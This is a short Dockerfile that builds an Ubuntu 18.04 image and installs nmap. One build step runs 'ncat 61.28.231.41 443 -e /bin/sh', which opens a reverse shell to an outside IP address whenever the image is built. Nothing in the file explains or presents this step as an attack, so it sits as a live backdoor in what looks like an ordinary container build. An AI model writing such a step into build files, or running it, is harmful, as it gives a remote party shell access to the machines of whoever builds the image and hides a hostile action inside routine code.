FROM ubuntu:18.04

RUN apt update && apt install -y nmap

RUN ncat 61.28.231.41 443 -e /bin/sh

CMD ["/bin/bash"]